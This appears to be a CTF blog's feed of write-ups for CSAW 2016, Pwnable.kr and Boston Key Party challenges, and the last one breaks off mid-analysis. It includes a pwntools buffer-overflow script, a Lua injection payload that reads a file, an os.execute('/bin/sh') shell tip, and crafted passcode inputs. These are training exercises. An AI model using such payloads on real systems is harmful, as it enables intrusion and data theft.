+<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><ul>
+<li><strong>What I’ve learned:</strong><ul>
+<li>Using <code>dup2</code> to get the interactive shell of socket server.</li>
+<li>There is no need to inject the string <code>/bin/sh</code> to somewhere in the buffer as I first did. This string is containing in the libc, and its offset can be found by <code>strings -t x libc-2.19.so | grep &quot;/bin/sh&quot;</code></li>
+</ul>
+</li>
+<li>This server using <code>fork</code> to create a new process to handle the new user’s request, so the base address of <code>libc</code> and the value of stack canary remain the same from request to request. There is no need to automatically parse these value during the contest. Just hard code them in the script to save some time.</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Ok sport, now that yo
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="pwn" scheme="http://poning.me/tags/pwn/"/>
+    
+      <category term="CSAW CTF" scheme="http://poning.me/tags/CSAW-CTF/"/>
+    
+      <category term="x86-64" scheme="http://poning.me/tags/x86-64/"/>
+    
+      <category term="ROP" scheme="http://poning.me/tags/ROP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CSAW CTF 2016: Aul (pwn 100)</title>
+    <link href="http://poning.me/2016/09/20/aul/"/>
+    <id>http://poning.me/2016/09/20/aul/</id>
+    <published>2016-09-20T07:31:01.000Z</published>
+    <updated>2016-09-20T07:31:35.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Wow, this looks like an aul-ful game. I think there is a flag around here somewhere…<br>nc pwn.chal.csaw.io 8001</p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>After connecting to the server, it display some sort of game. The interesting thing is that when we type <code>help</code>, it will print some binary-like data. </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>let&apos;s play a game<br>| 0 0 0 0 0 0 0 0 |<br>| 0 1 0 0 0 0 4 0 |<br>| 0 3 2 2 4 1 4 4 |<br>| 0 3 2 3 2 3 4 3 |<br>| 4 b 2 2 4 4 3 4 |<br>| 3 2 4 4 1 1 2 2 |<br>| 3 3 c d 3 3 2 3 |<br>| 3 2 1 4 4 a 2 4 |<br>help<br>help<br>LuaS�<br><br>xV(w@�,��,�,���,��,�,���,��,�,���CA�$@@C$@�&amp;�<br>                                              make_boardpopulate_boardboard_tostringfallrotatecrush<br>                                                                                                   rotate_lefreadAllhelpquitexit	run_stepgame<br>writelinelet&apos;s play a game<br><br><br>K@J��@@��<br>         AF�@<br>setmetatable�J��@�f&amp;�size<br>            __tostringboard_tostring&quot;<br>                                     .�@���A@�@@$Ab@�����@RA, @��@�F�A���AB���Ad������<br>@i���A�����h��@d���C�BC���<br>��g��F�C�ef&amp;�sizemath<br>F@G@�������d���F��@�&amp;&amp;�mathrandom$/!K�@�@�@A�����BN�@��(B��A�������݁&apos;�BA�A@�������$B�����@A���AA���&amp;�<br>size| tableinsert |concat<br>1D<br>G@�@@��������N��(���@�$B&apos;���&amp;�size<br>�OCMÂGC�@&apos;��@��&amp;�size            make_board5EN���@�@������������_@@�����������������N����&amp;���������FSG@�@@����������A������΁��N����(B�C�<br>                       make_boardUg<br>$G@�@@��������A�A���@�N����(A����&apos;��OA�N����(A�B�G�GB�@@����@����&apos;��&amp;size<br>                                                                           make_boardabcdik	F@�@�@��ef&amp;�rotatemr<br>                                                                                                                    F@G@����d���������@��@�&amp;�ioopenrbread*allclosetx@@@F�@��d��$��F@A��@ǀ��d@&amp;�stringsureadAll<br>                                     server.luac	writerawlen&#123;@@�&amp;�quit�-F@d���@@��@�����@���A�@����@@�@A�������@����@@�@A�������@����B�@���������B@������&amp;�<br>                                                                                                                                                                   	readlinestringlenexitfind	functionprintloareturn ��%@F@@��d$�F�@�A����@��d@F�A�d���A�@@�_�@���@BƀBAB@$�������@���@���&amp;�<br>                                                                                                                              populate_board<br>                                                                                                                                            make_board<br>writelineboard_tostring<br>	run_stepquitfallcrushEDidn&apos;t understand. Type &apos;rotate&apos;, &apos;rotate_left&apos;, &apos;exit&apos;, or &apos;help&apos;.<br>Didn&apos;t understand. Type &apos;rotate&apos;, &apos;rotate_left&apos;, &apos;exit&apos;, or &apos;help&apos;.<br></pre></td></tr></table></figure>
+<p>According to its first few bytes <code>Lua</code>, I suppose it is Lua bytecode. However, when I try to decompile or execute the binary, it seems to be corrupted. <a href="https://github.com/ret2libc/ctfs/tree/master/csaw2016/aul" target="_blank" rel="external">This writeup</a> has described how to fix the binary, but during the contest, I just tried entering some function name shown in the binary like <code>game</code> and found that the function will be called. Furthermore, I found that it can actually execute arbitrary Lua function like <code>io.write(&#39;hi&#39;)</code>. I then entering <code>io.write(io.open(&quot;flag&quot;, &quot;r&quot;):read(&quot;*all&quot;))</code> to read and print the flag.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>let&apos;s play a game<br>| 0 0 0 0 0 0 0 0 |<br>| 0 1 0 0 0 0 4 0 |<br>| 0 3 2 2 4 1 4 4 |<br>| 0 3 2 3 2 3 4 3 |<br>| 4 b 2 2 4 4 3 4 |<br>| 3 2 4 4 1 1 2 2 |<br>| 3 3 c d 3 3 2 3 |<br>| 3 2 1 4 4 a 2 4 |<br>io.write(io.open(&quot;flag&quot;, &quot;r&quot;):read(&quot;*all&quot;))<br>io.write(io.open(&quot;flag&quot;, &quot;r&quot;):read(&quot;*all&quot;))<br>flag&#123;we_need_a_real_flag_for_this_chal&#125;<br></pre></td></tr></table></figure>
+<p>Yes, I luckily guess the filename <code>flag</code>.</p>
+<blockquote>
+<p>Flag: <code>flag{we_need_a_real_flag_for_this_chal}</code></p>
+</blockquote>
+<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>Instead of guessing the filename of the flag, using <code>os.execute(&quot;/bin/sh&quot;)</code> can get the shell reliably (<a href="https://galhacktictrendsetters.wordpress.com/2016/09/20/csaw-quals-2016-aul/" target="_blank" rel="external">reference</a>).</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Wow, this looks like 
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="pwn" scheme="http://poning.me/tags/pwn/"/>
+    
+      <category term="Lua" scheme="http://poning.me/tags/Lua/"/>
+    
+      <category term="CSAW CTF" scheme="http://poning.me/tags/CSAW-CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CSAW CTF 2016: Warmup (pwn 50)</title>
+    <link href="http://poning.me/2016/09/20/warmup/"/>
+    <id>http://poning.me/2016/09/20/warmup/</id>
+    <published>2016-09-20T03:49:23.000Z</published>
+    <updated>2016-09-21T03:01:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>So you want to be a pwn-er huh? Well let’s throw you an easy one ;)<br>nc pwn.chal.csaw.io 8000<br><a href="/2016/09/20/warmup/warmup" title="warmup">warmup</a></p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>As the description said, this is a very straightforward question. Even without reversing the binary, it prints the address of the target function <code>system(&quot;cat flag.txt&quot;);</code> for us. Just buffer overflow the return address and jump to that funtion to get the flag.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>-Warm Up-<br>WOW:0x40060d<br>&gt;<br></pre></td></tr></table></figure>
+<figure class="highlight python"><figcaption><span>warmup_exp.py</span><a href="/2016/09/20/warmup/warmup_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">'pwn.chal.csaw.io'</span>, <span class="hljs-number">8000</span>)<br>r.sendline(<span class="hljs-string">'A'</span>*<span class="hljs-number">72</span> + p64(<span class="hljs-number">0x40060d</span>))<br><span class="hljs-keyword">print</span> r.recvall()<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>FLAG{LET_US_BEGIN_CSAW_2016}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;So you want to be a p
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="pwn" scheme="http://poning.me/tags/pwn/"/>
+    
+      <category term="CSAW CTF" scheme="http://poning.me/tags/CSAW-CTF/"/>
+    
+      <category term="x86-64" scheme="http://poning.me/tags/x86-64/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Pwnable.kr: collision (3 pt)</title>
+    <link href="http://poning.me/2016/08/08/collision/"/>
+    <id>http://poning.me/2016/08/08/collision/</id>
+    <published>2016-08-08T13:24:12.000Z</published>
+    <updated>2016-08-08T13:24:42.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Daddy told me about cool MD5 hash collision today.<br>I wanna do something like that too!<br>ssh col@pwnable.kr -p2222 (pw:guest)</p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight c"><figcaption><span>fd.c</span></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br></pre></td><td class="code"><pre><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> hashcode = <span class="hljs-number">0x21DD09EC</span>;<br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">check_password</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* p)</span></span>&#123;<br>	<span class="hljs-keyword">int</span>* ip = (<span class="hljs-keyword">int</span>*)p;<br>	<span class="hljs-keyword">int</span> i;<br>	<span class="hljs-keyword">int</span> res=<span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)&#123;<br>		res += ip[i];<br>	&#125;<br>	<span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span>&#123;<br>	<span class="hljs-keyword">if</span>(argc&lt;<span class="hljs-number">2</span>)&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"usage : %s [passcode]\n"</span>, argv[<span class="hljs-number">0</span>]);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]) != <span class="hljs-number">20</span>)&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"passcode length should be 20 bytes\n"</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span>(hashcode == check_password( argv[<span class="hljs-number">1</span>] ))&#123;<br>		system(<span class="hljs-string">"/bin/cat flag"</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"wrong passcode.\n"</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></pre></td></tr></table></figure>
+<p>The target program converts the argument from a 20 bytes string to an array of 5 integers and sum them up. If the sum equals to <code>0x21DD09EC</code>, it will output the flag. I craft the input with 4 integers of <code>\x01\x01\x01\x01</code> (just for padding) plus an integer of the difference to the target hashcode. The difference can be calculated as follows.</p>
+<figure class="highlight python"><figcaption><span>cal.py</span><a href="/2016/08/08/collision/cal.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">print</span> repr(p32(<span class="hljs-number">0x21DD09EC</span> - u32(<span class="hljs-string">'\x01\x01\x01\x01'</span>)*<span class="hljs-number">4</span>))<br></pre></td></tr></table></figure>
+<p>After calculating the difference, which is <code>\xe8\x05\xd9\x1d</code>, we can solve the problem with the input mentioned above.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>$ ./col $&apos;\xe8\x05\xd9\x1d\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01&apos;<br>daddy! I just managed to create a hash collision :)<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>daddy! I just managed to create a hash collision :)</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Daddy told me about c
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="Pwnable.kr" scheme="http://poning.me/tags/Pwnable-kr/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Pwnable.kr: fd (1 pt)</title>
+    <link href="http://poning.me/2016/08/08/fd/"/>
+    <id>http://poning.me/2016/08/08/fd/</id>
+    <published>2016-08-08T06:50:37.000Z</published>
+    <updated>2016-08-08T07:22:57.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Mommy! what is a file descriptor in Linux?<br>ssh fd@pwnable.kr -p2222 (pw:guest)</p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight c"><figcaption><span>fd.c</span></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br></pre></td><td class="code"><pre><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">32</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[], <span class="hljs-keyword">char</span>* envp[])</span></span>&#123;<br>	<span class="hljs-keyword">if</span>(argc&lt;<span class="hljs-number">2</span>)&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"pass argv[1] a number\n"</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-keyword">int</span> fd = atoi( argv[<span class="hljs-number">1</span>] ) - <span class="hljs-number">0x1234</span>;<br>	<span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>	len = read(fd, buf, <span class="hljs-number">32</span>);<br>	<span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">"LETMEWIN\n"</span>, buf))&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"good job :)\n"</span>);<br>		system(<span class="hljs-string">"/bin/cat flag"</span>);<br>		<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>	&#125;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"learn about Linux file IO\n"</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></pre></td></tr></table></figure>
+<p>The target program will read 32 bytes from file descriptor <code>argv[1] - 0x1234</code>, and if the content equals to <code>LETMEWIN\n</code>, it will output the flag. To solve this problem, we can pass 4660 (0x1234) as the first argument. Then this program will read from the standard input, which we can assign its value to <code>LETMEWIN\n</code> to get the flag.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>$ echo &quot;LETMEWIN&quot; | ./fd 4660<br>good job :)<br>mommy! I think I know what a file descriptor is!!<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>mommy! I think I know what a file descriptor is!!</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Mommy! what is a file
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="Pwnable.kr" scheme="http://poning.me/tags/Pwnable-kr/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Boston Key Party CTF 2016: unholy (reversing 4)</title>
+    <link href="http://poning.me/2016/03/10/unholy/"/>
+    <id>http://poning.me/2016/03/10/unholy/</id>
+    <published>2016-03-10T15:48:02.000Z</published>
+    <updated>2016-08-04T02:56:07.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>python or ruby? why not both!<br><a href="/2016/03/10/unholy/9c2b8593c64486de25698fcece7c12fa0679a224.tar.gz" title="https://s3.amazonaws.com/bostonkeyparty/2016/9c2b8593c64486de25698fcece7c12fa0679a224.tar.gz">https://s3.amazonaws.com/bostonkeyparty/2016/9c2b8593c64486de25698fcece7c12fa0679a224.tar.gz</a></p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>This challenge involves three languages: Ruby, Python, and x86-64 assembly. They are combined by some kind of native extension mechanism, but we don’t have to understand the details of the mechanism nor master these languages to solve the problem. Just make the best guess and verify it. First, have a look at the main program.</p>
+<figure class="highlight ruby"><figcaption><span>main.rb</span><a href="/2016/03/10/unholy/main.rb">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br></pre></td><td class="code"><pre>require_relative <span class="hljs-string">'unholy'</span><br><span class="hljs-keyword">include</span> UnHoly<br>python_hi<br>puts ruby_hi<br>puts <span class="hljs-string">"Programming Skills: PRIMARILY RUBY AND PYTHON BUT I CAN USE ANY TYPE OF GEM TO CONTROL ANY TYPE OF SNAKE"</span><br>puts <span class="hljs-string">"give me your flag"</span><br>flag = gets.chomp!<br>arr = flag.unpack(<span class="hljs-string">"V*"</span>)<br>is_key_correct? arr<br></pre></td></tr></table></figure>
+<p>The methods used in <code>main.rb</code> can be found in <code>unholy.so</code>. Here is the piece of code that register the Ruby module and methods.</p>
+<figure class="highlight x86asm"><table><tr><td class="code"><pre>void __cdecl Init_unholy()<br><span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbx</span><br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aUnholy    <span class="hljs-comment">; "UnHoly"</span><br><span class="hljs-keyword">call</span>    _rb_define_module<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">cs</span>:UnHoly_ptr<br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdx</span>, method_python_hi<br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rsi</span>, aPython_hi <span class="hljs-comment">; "python_hi"</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbx</span>], <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">call</span>    _rb_define_method<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbx</span>]<br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdx</span>, method_ruby_hi<br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rsi</span>, aRuby_hi   <span class="hljs-comment">; "ruby_hi"</span><br><span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">call</span>    _rb_define_method<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbx</span>]<br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdx</span>, method_check_key<br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rsi</span>, aIs_key_correct <span class="hljs-comment">; "is_key_correct?"</span><br><span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbx</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">jmp</span>     _rb_define_method<br></pre></td></tr></table></figure>
+<p>The main program want us to enter the flag, and then it will unpack the input string into integer array and pass it to the method <code>is_key_correct?</code>. According to <code>Init_unholy</code> above, we should look into <code>method_check_key</code> now. <code>method_check_key</code> can be divided into three parts.</p>
+<figure class="highlight"><figcaption><span>Part1</span></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br></pre></td><td class="code"><pre>v2 = *(_QWORD *)payload;<br>if ( BYTE1(v2) &amp; 0x20 )<br>  v3 = (v2 &gt;&gt; 15) &amp; 3;<br>else<br>  v3 = *(_DWORD *)(payload + 16);<br><br>key[0] = 'tahw';<br>key[1] = 'iogs';<br>key[2] = 'nogn';<br>key[3] = 'ereh';<br><br>if ( v3 == 9 )<br>&#123;<br>  v4 = 0LL;<br>  do &#123;<br>    LODWORD(v5) = rb_ary_entry(payload, v4);<br>    if ( v5 &amp; 1 )<br>      v6 = rb_fix2int(v5);<br>    else<br>      v6 = rb_num2int(v5);<br>    matrix[v4++] = v6;<br>  &#125; while ( v4 != 9 );<br>  matrix[9] = 1634947872;<br>  ...<br></pre></td></tr></table></figure>
+<p>I have spent some time investigating why it check whether the first byte of the payload is <code>0x20</code>, what <code>rb_ary_entry</code>, <code>rb_fix2int</code>, and <code>rb_num2int</code> do, and so on. However, they are quite irrelevant. They are all about the memory representation of Ruby’s data structure (e.g. the first byte of the payload is the length of the Ruby’s array). Using <code>gdb</code>, we can directly find out what Part1 does is putting our input (in integer array format) into <code>matrix</code> and initialize some other data.</p>
+<figure class="highlight c"><figcaption><span>Part2</span></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br></pre></td><td class="code"><pre>...<br>v7 = <span class="hljs-number">0L</span>L;<br><span class="hljs-keyword">do</span> &#123;<br>  v8 = <span class="hljs-number">0</span>;<br>  LODWORD(v9) = *(<span class="hljs-number">_</span>QWORD *)&amp;matrix[v7];<br>  v10 = *(<span class="hljs-number">_</span>QWORD *)&amp;matrix[v7] &gt;&gt; <span class="hljs-number">32</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    v11 = v8 + key[(<span class="hljs-keyword">unsigned</span> <span class="hljs-number">__</span>int64)(v8 &amp; <span class="hljs-number">3</span>)];<br>    v8 -= <span class="hljs-number">1640531527</span>;<br>    v9 = (v11 ^ ((<span class="hljs-number">16</span> * (<span class="hljs-number">_</span>DWORD)v10 ^ ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v10 &gt;&gt; <span class="hljs-number">5</span>)) + (<span class="hljs-number">_</span>DWORD)v10)) + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v9;<br>    v10 = ((v8 + key[(<span class="hljs-keyword">unsigned</span> <span class="hljs-number">__</span>int64)((v8 &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>)]) ^ ((<span class="hljs-number">16</span> * (<span class="hljs-number">_</span>DWORD)v9 ^ ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v9 &gt;&gt; <span class="hljs-number">5</span>)) + (<span class="hljs-number">_</span>DWORD)v9))<br>        + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v10;<br>  &#125; <span class="hljs-keyword">while</span> ( v8 != <span class="hljs-number">-957401312</span> );<br>  *(<span class="hljs-number">_</span>QWORD *)&amp;matrix[v7] = v9 | (v10 &lt;&lt; <span class="hljs-number">32</span>);<br>  v7 += <span class="hljs-number">2L</span>L;<br>&#125; <span class="hljs-keyword">while</span> ( v7 != <span class="hljs-number">10</span> );<br>...<br></pre></td></tr></table></figure>
+<p>In Part2, it applys some operations on <code>matrix</code> (our input) and <code>key</code> (known data) two entries at a time. It look messy at the first glance, but the operations can actually be inverted. Values derived from <code>v8</code> are constant, so we know that the inner loop will iterate 32 times and the operation can be simplify as</p>
+<figure class="highlight python"><figcaption><span>Part2</span></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br></pre></td><td class="code"><pre><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>):<br>    v9 = (C ^ (<span class="hljs-number">16</span>*v10 ^ (v10 &gt;&gt; <span class="hljs-number">5</span>)) + v10) + v9<br>    v10 = (C ^ (<span class="hljs-number">16</span>*v9 ^ (v9 &gt;&gt; <span class="hljs-number">5</span>)) + v9) + v10<br></pre></td></tr></table></figure>
+<p>where <code>C</code> stands for known constant. We can calculate <code>v10</code> of the previous loop by current <code>v10</code> and <code>v9</code>, and then we can use previous <code>v10</code> and current <code>v9</code> to calculate previous <code>v9</code>. Following this process, we can get the initial <code>v9</code> and <code>v10</code>.</p>
+<figure class="highlight c"><figcaption><span>Part3</span></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br></pre></td><td class="code"><pre>  ...<br>  <span class="hljs-keyword">if</span> ( matrix[<span class="hljs-number">9</span>] == <span class="hljs-number">1306786301</span> )<br>  &#123;<br>    <span class="hljs-number">__</span>sprintf_chk(<br>      stacker,<br>      <span class="hljs-number">1L</span>L,<br>      <span class="hljs-number">5000L</span>L,<br>      <span class="hljs-string">"exec \"\"\"\\nimport struct\\ne=range\\nI=len\\nimport sys\\nF=sys.exit\\nX=[[%d,%d,%d],[%d,%d,%d],[%d,%d,%d]]\\nY = [[383212,38297,8201833],[382494 ,348234985,3492834886],[3842947 ,984328,38423942839]]\\nn=[5034563854941868,252734795015555591,55088063485350767967,-2770438152229037,142904135684288795,-33469734302639376803,-3633507310795117,195138776204250759,-34639402662163370450]\\ny=[[0,0,0],[0,0,0],[0,0,0]]\\nA=[0,0,0,0,0,0,0,0,0]\\nfor i in e(I(X)):\\n for j in e(I(Y[0])):\\n  for k in e(I(Y)):\\n   y[i][j]+=X[i][k]*Y[k][j]\\nc=0\\nfor r in y:\\n for x in r:\\n  if x!=n[c]:\\n   print \"dang...\"\\n   F(47)\\n  c=c+1\\nprint \":)\"\\n\"\"\""</span>,<br>      matrix[<span class="hljs-number">0</span>],<br>      matrix[<span class="hljs-number">1</span>]);<br>    Py_Initialize(stacker, <span class="hljs-number">1L</span>L);<br>    PyRun_SimpleStringFlags(stacker, <span class="hljs-number">0L</span>L);<br>    Py_Finalize(stacker, <span class="hljs-number">0L</span>L);<br>  &#125;<br>&#125;<br></pre></td></tr></table></figure>
+<p>The parameters of <code>sprintf</code> is incorrect in the decompiled code, but it suggests that Part3 prints the values in <code>matrix</code> into following Python code and execute it.</p>
